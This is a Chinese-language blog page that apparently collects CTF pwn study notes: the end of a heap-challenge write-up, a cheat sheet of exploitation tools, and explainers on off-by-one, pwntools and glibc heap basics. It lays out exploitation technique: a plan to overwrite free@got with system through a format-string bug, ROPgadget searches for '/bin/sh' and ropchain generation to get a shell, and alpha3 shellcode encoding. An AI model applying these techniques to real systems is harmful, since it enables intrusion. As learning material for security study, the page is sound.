<li>根据编号来删除 order，但是这里只是单纯地 free 掉，并没有置为 NULL，因此会出现 use after free 的漏洞。</li>
<li>提交订单，将两本书的名字合在一起。这里由于上面堆溢出的问题，这里也会出现堆溢出的漏洞。</li>
<li>此外，在程序退出之前存在一个<strong>格式化字符串漏洞</strong>。</li>
</ul>
<p>这里虽然程序的漏洞能力很强，但是所有进行 malloc 的大小都是完全固定的，我们只能借助这些分配的 chunk 来进行操作。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>程序中主要的漏洞在于堆溢出和格式化字符串漏洞，但是如果想要利用格式化字符串漏洞，必然需要溢出对应的 dest 数组。具体思路如下</p>
<ol>
<li>利用堆溢出进行 chunk extend，使得在 submit 中 时，恰好返回第二个订单处的位置。在 submit 之前，布置好堆内存布局，使得把字符串拼接后恰好可以覆盖 dest 为指定的格式化字符串。<code>malloc(0x140uLL)</code></li>
<li>通过构造 dest 为指定的格式化字符串：一方面泄漏 __libc_start_main_ret 的地址，<strong>一方面控制程序重新返回执行</strong>。这时，便可以知道 libc 基地址，system 等地址。需要注意的是由于一旦 submit 之后，程序就会直接直接退出，所以我们比较好的思路就是修改 fini_array 中的变量，以便于达到程序执行完毕后，<strong>重新返回我们期待的位置</strong>。这里我们会使用一个 trick，程序每次读取选择的时候会读取 128 大小，在栈上。而程序最后在输出 dest 的时候，之前所读取的那部分选择必然是在栈上的，所以我们如果我们在栈上预先布置好一些控制流指针，那就可以来控制程序的执行流程。</li>
<li>再次利用格式化字符串漏洞，覆盖 free@got 为 system 地址，从而达到任意命令执行的目的。</li>
</ol>
<p>这里，各个参数的偏移是</p>
<ul>
<li>Fini_array0 : 5+8&#x3D;13</li>
<li>__libc_start_main_ret : 5+0x1a&#x3D;31。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp  0x7ffe6a7f3ec8 —▸ 0x400c93 ◂— mov    eax, 0</span><br><span class="line">01:0008│      0x7ffe6a7f3ed0 ◂— 0x100000000</span><br><span class="line">02:0010│      0x7ffe6a7f3ed8 —▸ 0x9f20a0 ◂— 0x3a3120726564724f (&#x27;Order 1:&#x27;)</span><br><span class="line">03:0018│      0x7ffe6a7f3ee0 —▸ 0x400d38 ◂— pop    rcx</span><br><span class="line">04:0020│      0x7ffe6a7f3ee8 —▸ 0x9f2010 ◂— 0x6666666666667325 (&#x27;%sffffff&#x27;)</span><br><span class="line">05:0028│      0x7ffe6a7f3ef0 —▸ 0x9f20a0 ◂— 0x3a3120726564724f (&#x27;Order 1:&#x27;)</span><br><span class="line">06:0030│      0x7ffe6a7f3ef8 —▸ 0x9f2130 ◂— 0x6564724f203a3220 (&#x27; 2: Orde&#x27;)</span><br><span class="line">07:0038│      0x7ffe6a7f3f00 ◂— 0xa35 /* &#x27;5\n&#x27; */</span><br><span class="line">08:0040│      0x7ffe6a7f3f08 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0b:0058│      0x7ffe6a7f3f20 ◂— 0xff00000000000000</span><br><span class="line">0c:0060│      0x7ffe6a7f3f28 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0f:0078│      0x7ffe6a7f3f40 ◂— 0x5f5f00656d697474 /* &#x27;ttime&#x27; */</span><br><span class="line">10:0080│      0x7ffe6a7f3f48 ◂— 0x7465675f6f736476 (&#x27;vdso_get&#x27;)</span><br><span class="line">11:0088│      0x7ffe6a7f3f50 ◂— 0x1</span><br><span class="line">12:0090│      0x7ffe6a7f3f58 —▸ 0x400cfd ◂— add    rbx, 1</span><br><span class="line">13:0098│      0x7ffe6a7f3f60 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">15:00a8│      0x7ffe6a7f3f70 —▸ 0x400cb0 ◂— push   r15</span><br><span class="line">16:00b0│      0x7ffe6a7f3f78 —▸ 0x400780 ◂— xor    ebp, ebp</span><br><span class="line">17:00b8│      0x7ffe6a7f3f80 —▸ 0x7ffe6a7f4070 ◂— 0x1</span><br><span class="line">18:00c0│      0x7ffe6a7f3f88 ◂— 0xd8d379f22453ff00</span><br><span class="line">19:00c8│ rbp  0x7ffe6a7f3f90 —▸ 0x400cb0 ◂— push   r15</span><br><span class="line">1a:00d0│      0x7ffe6a7f3f98 —▸ 0x7f9db2113830 (__libc_start_main+240) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/23/%E5%B7%A5%E5%85%B7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/23/%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">工具</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-10-23 22:38:45" itemprop="dateCreated datePublished" datetime="2024-10-23T22:38:45+08:00">2024-10-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-24 22:16:20" itemprop="dateModified" datetime="2024-11-24T22:16:20+08:00">2024-11-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本篇主要更新pwn过程中使用的工具及其使用方法，功能不做赘述。</p>
<hr>
<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a><strong>pwntools</strong></h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 网址，端口号<span class="comment">#连接网站</span></span><br></pre></td></tr></table></figure>

<p>几乎用于很简单的pwn题或直接连接靶机做题</p>
<hr>
<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>

<p>用于查找代码中对应的汇编命令的地址</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line">ROPgadget --binary 文件名 --string <span class="string">&#x27;/sh&#x27;</span></span><br><span class="line"></span><br><span class="line">ROPgadget --binary 文件名 --string <span class="string">&#x27;sh&#x27;</span></span><br><span class="line"></span><br><span class="line">ROPgadget --binary 文件名 --string <span class="string">&#x27;cat flag&#x27;</span></span><br><span class="line"></span><br><span class="line"> ROPgadget --binary 文件名 --string <span class="string">&#x27;cat flag.txt&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用于查找代码中对应的getshell命令字符或关于flag的指令</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --ropchain</span><br></pre></td></tr></table></figure>

<p>生成现成的ropchain，可以直接实现getshell（静态，且要求文件使用gets函数读取，因为静态链较长，一般无法缩短过多）</p>
<hr>
<h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p>修改ld（我一般会将下载的放置在题目文件夹，否则需要相对路径）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter 版本号/ld-linux.so<span class="number">.2</span> ./文件名</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter <span class="number">2.23</span>-0ubuntu3_amd64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span> ./pwn</span><br></pre></td></tr></table></figure>

<p>修改libc</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so<span class="number">.6</span>  ./（路径）/libc.so<span class="number">.6</span> ./pwn</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so<span class="number">.6</span> ./libc.so<span class="number">.6</span> ./pwn</span><br></pre></td></tr></table></figure>

<p>添加libc</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --add-needed 版本号/libc.so<span class="number">.6</span> ./文件名</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">patchelf --add-needed <span class="number">2.23</span>-0ubuntu3_amd64/libc.so<span class="number">.6</span> ./pwn</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>补充常用的libc版本</p>
<blockquote>
<p>2.23-0ubuntu11.3_amd64<br>2.27-3ubuntu1.5_amd64</p>
</blockquote>
<hr>
<h2 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h2><p>与ROPgadget类似，静态链用法</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --ropchain//一般生成较长，可人为缩减</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc all in one"></a>glibc all in one</h1><h4 id="一般情况"><a href="#一般情况" class="headerlink" title="一般情况"></a>一般情况</h4><p>先展出所有libc列表</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">list</span></span><br></pre></td></tr></table></figure>

<p>下载所需要的glibc版本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./download 版本号  <span class="comment">#下载所需版本</span></span><br></pre></td></tr></table></figure>

<h4 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h4><p>展出老版本列表</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat old_list</span><br></pre></td></tr></table></figure>

<p>下载老版本列表</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./download_old 版本号</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先后顺序搞清楚，下载后移到题目文件夹，方便搭建环境</p>
<hr>
<h1 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h1><p>开了PIE</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(0x相对基址偏移)  //下断点下到特定地址</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a><strong>alpha3</strong></h2><p>主要用于shellcode修改为题目的可见字符（使用alpha3进行编码shellcode，生成一段没有坏字符的shellcode。然后使用jmp esp进行shellcode注入。）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd alpha3</span><br><span class="line">python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;存储shellcode的文件&quot; &gt; 输出文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/21/off-by-one/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/21/off-by-one/" class="post-title-link" itemprop="url">off-by-one</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-10-21 22:14:10" itemprop="dateCreated datePublished" datetime="2024-10-21T22:14:10+08:00">2024-10-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-20 20:24:48" itemprop="dateModified" datetime="2024-11-20T20:24:48+08:00">2024-11-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="off-by-one-利用思路"><a href="#off-by-one-利用思路" class="headerlink" title="off-by-one 利用思路"></a>off-by-one 利用思路</h2><ol>
<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>
</ol>
<p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check 。</p>
<p> for 循环的边界没有控制好导致写入多执行了一次，这也被称为栅栏错误</p>
<p>数据发生了溢出覆盖到了下一个堆块的 prev_size 域 print ‘A’*17</p>
<p>strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。 strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。</p>
<p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。 还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/20/pwntools%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/20/pwntools%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">pwntools常用函数</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-10-20 19:16:57 / 修改时间：19:17:33" itemprop="dateCreated datePublished" datetime="2024-10-20T19:16:57+08:00">2024-10-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><code>flat([cyclic(0x50), passwd_addr + 0x4])</code>以下是对这一行代码的解析：</p>
<h3 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h3><ol>
<li><strong><code>cyclic(0x50)</code></strong>:<ul>
<li><code>cyclic</code> 是 <code>pwntools</code> 中的一个函数，用于生成一个长度为 0x50（即 80 字节）的循环模式字符串。这个字符串通常用于缓冲区溢出攻击中，以便在后续的溢出过程中更容易地识别栈的偏移量。</li>
<li>例如，它可能生成一个像 <code>abcdeabcdeabcde...</code> 的模式，以帮助开发者确定输入数据中某个特定点的偏移量。</li>
</ul>
</li>
<li><strong><code>passwd_addr + 0x4</code></strong>:<ul>
<li><code>passwd_addr</code> 代表一个变量，通常是某个内存地址，可能是程序中存储密码的地方。</li>
<li><code>+ 0x4</code> 表示在这个地址的基础上偏移 4 字节。这可能是因为你想访问该地址后面的数据，比如一个指针或某个结构体的字段。</li>
</ul>
</li>
<li><strong><code>flat([...])</code></strong>:<ul>
<li><code>flat</code> 是 <code>pwntools</code> 提供的另一个函数，用于将传入的列表展平为一个连续的字节串。它会将列表中的元素（比如字节串、整数等）按顺序组合成一个连续的内存块。</li>
<li>在这个上下文中，<code>flat</code> 会将 <code>cyclic(0x50)</code> 生成的字节串和 <code>passwd_addr + 0x4</code> 的值（通常是以字节形式表示的内存地址）连接在一起，形成一个最终的输入数据。</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/18/%E5%A0%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/18/%E5%A0%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">堆的学习总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-10-18 20:02:52" itemprop="dateCreated datePublished" datetime="2024-10-18T20:02:52+08:00">2024-10-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-20 21:48:58" itemprop="dateModified" datetime="2024-11-20T21:48:58+08:00">2024-11-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><blockquote>
<p>堆（heap）是一种数据结构，在程序运行的过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。</p>
<p>堆是程序虚拟地址空间中的一块连续的线性区域，它<strong>由低地址向高地址方向增长（和栈的增长方向相反）</strong>，管理堆的程序也称为堆管理器。</p>
</blockquote>
<p>目前 Linux 标准发行版中使用的堆分配器是 Glibc 中的堆分配器：<code>ptmalloc2</code></p>
<p>堆的基本操作是分配和回收，<code>ptmalloc2</code> 主要通过 <code>malloc()</code> 和 <code>free()</code> 函数来分配和释放内存块<strong>（漏洞的主要产生地）</strong>。</p>
<hr>
<p><strong>原文源自（<a target="_blank" rel="noopener" href="https://www.uf4te.cn/posts/463ab4ed.html%EF%BC%89%E6%A0%B9%E6%8D%AE%E8%87%AA%E5%B7%B1%E7%90%86%E8%A7%A3%E7%AD%89%E5%81%9A%E4%BA%86%E5%B0%8F%E9%83%A8%E5%88%86%E8%B0%83%E6%95%B4%E4%BB%A5%E5%8F%8A%E8%A1%A5%E5%85%85%E3%80%82">https://www.uf4te.cn/posts/463ab4ed.html）根据自己理解等做了小部分调整以及补充。</a></strong></p>
<h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><h3 id="malloc-未初始化仅分配"><a href="#malloc-未初始化仅分配" class="headerlink" title="malloc(未初始化仅分配)"></a>malloc(未初始化仅分配)</h3><blockquote>
<p>函数定义：<code>void *malloc(size_t size)</code></p>
<p>其中：</p>
<p><code>size</code> 是内存块的大小，以字节为单位</p>
</blockquote>
<p><code>malloc()</code> 的作用是分配所需的内存空间（<em>不会对内存空间进行初始化</em>，这点与calloc不同），并返回一个指向它的指针；如果请求失败，则返回 NULL</p>
<ul>
<li>当 <code>size = 0</code> 时，返回当前系统允许的堆的最小内存块</li>
<li>当 <code>size</code> 为负数时，<strong>由于在大多数系统上，size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配</li>
</ul>
<p>以一个简单的例子来看看 <code>malloc()</code> 函数和堆：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过 GDB 调试可以看到，在执行 <code>malloc()</code> 函数前，程序的地址空间里是没有堆的：</p>
<p>执行 <code>malloc()</code> 函数后：</p>
<p>可见程序中最开始是没有堆这部分空间的，在用户通过 <code>malloc()</code> 申请内存后才会出现，并且会一次性申请很大空间的堆段（<code>0x555555559000 ~ 0x55555557a000</code>）</p>
<blockquote>
<p>注意：新版本的 Glibc 对堆结构的管理有些区别，以上图是在 Glibc 2.37 的 Kali Linux 2024.1 中进行的测试</p>
<p>而在 Glibc 2.23 的 Ubuntu 16.04 中是这样的：</p>
</blockquote>
<hr>
<h4 id="calloc（初始化分配）"><a href="#calloc（初始化分配）" class="headerlink" title="calloc（初始化分配）"></a>calloc（初始化分配）</h4><blockquote>
<p>函数定义：<code>void *calloc(size_t nitems, size_t size)</code></p>
<p>其中：</p>
<p><code>nitems</code> 为要被分配的元素个数；<code>size</code> 为元素的大小</p>
</blockquote>
<p><code>calloc()</code> 在功能上与 <code>malloc()</code> 几乎相同，最大区别在于 <em><code>calloc()</code> 申请内存空间后会将其全部初始化为 0</em></p>
<p>与malloc函数相似，使用 <code>calloc()</code> 函数时需要注意，如果分配的内存块过大，可能会导致内存不足的问题</p>
<hr>
<h4 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h4><blockquote>
<p>函数定义：<code>void *realloc(void *ptr, size_t size)</code></p>
<p>其中：</p>
<p><code>ptr</code> 是一个指向要重新分配内存的内存块的指针；<code>size</code> 是内存块的新的大小，以字节为单位</p>
</blockquote>
<p><code>realloc()</code> 的作用是调整之前通过 <code>malloc()</code> 或 <code>calloc()</code> 所分配的 <code>ptr</code> 所指向的内存块的大小，并返回一个指向重新分配大小的内存的指针；如果请求失败，则返回 NULL</p>
<ul>
<li>如果 <code>ptr</code> 为空指针，则会分配一个新的内存块，且函数返回一个指向它的指针，相当于 <code>malloc()</code></li>
<li>如果 <code>size = 0</code>，且 <code>ptr</code> 指向一个已存在的内存块，则 <code>ptr</code> 所指向的内存块会被释放，并返回一个空指针，相当于 <code>free()</code></li>
</ul>
<p>另外，针对重新申请的大小与之前申请内存的大小的关系，又有三种不同的情况：</p>
<ol>
<li><p>如果重新申请的大小 &gt; 之前申请内存的大小，且当前内存段后面有需要的内存空间，则<strong>直接扩展这段内存空间，<code>realloc()</code> 将返回原指针</strong></p>
</li>
<li><p>如果重新申请的大小 &gt; 之前申请内存的大小，且当前内存段后面的空闲空间不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块地址，<strong>相当于 <code>free() + malloc()</code></strong></p>
<blockquote>
<p>**如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小    **</p>
<p><strong>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</strong></p>
</blockquote>
</li>
<li><p>如果重新申请的大小 &lt; 之前申请内存的大小，堆块会直接缩小，被削减的内存会释放，<strong>这里的释放与 <code>free()</code> 不同</strong></p>
<blockquote>
<ul>
<li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li>
<li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li>
</ul>
</blockquote>
</li>
</ol>
<hr>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><blockquote>
<p>函数定义：<code>void free(void *ptr)</code></p>
<p>其中:</p>
<p><code>ptr</code> 是一个指向要释放内存的内存块的指针</p>
</blockquote>
<p><code>free()</code> 的作用是释放之前通过 <code>malloc()</code>、<code>calloc()</code> 或 <code>realloc()</code> 所分配的内存空间，该函数<strong>不返回任何值</strong></p>
<ul>
<li><p>如果传递的参数 <code>ptr</code> 是一个空指针，则无任何效果</p>
</li>
<li><p>当参数 <code>ptr</code> 已经被释放之后，再次释放会出现乱七八糟的效果（<strong>Double Free堆漏洞</strong>）</p>
</li>
<li><p>当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间（被 <code>mallopt</code> 禁用的情况下除外）</p>
<p><em>备注： mallopt函数可以控制 内存分配的函数 形如int mallopt(int param,int value)</em></p>
<p>param 的取值可以为</p>
<blockquote>
<p>M_CHECK_ACTION</p>
<p>M_MMAP_MAX</p>
<p>M_MMAP_THRESHOLD</p>
<p>M_MXFAST（从glibc2.3起）</p>
<p>M_PERTURB（从glibc2.4起）</p>
<p>M_TOP_PAD</p>
<p>M_TRIM_THRESHOLD</p>
</blockquote>
<p>value是以 <a target="_blank" rel="noopener" href="http://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=53426">字节</a>为单位的。</p>
</li>
</ul>
<p>还是以上面的例子来看，执行 <code>free()</code> 之后堆段并不会消失：</p>
<p>但是堆中的内容发生了变化：</p>
<p>我们申请的空间变成了 <code>Free chunk</code></p>
<blockquote>
<p>注意：新版本的 Glibc 对堆结构的管理有些区别，上图是在 Glibc 2.37 的 Kali Linux 2024.1 中进行的测试</p>
<p>而在 Glibc 2.23 的 Ubuntu 16.04 中是这样的：</p>
<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出7.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出7.png)</p>
</blockquote>
<p>通过 <code>free()</code> 释放的堆块不会立刻被回收，它们会变成 <code>Free chunk</code> 并加上了一种 <code>xxx bin</code> 的名字，例如上图 Glibc 2.23 中的 <code>fastbins</code>（<code>fast bin</code>）</p>
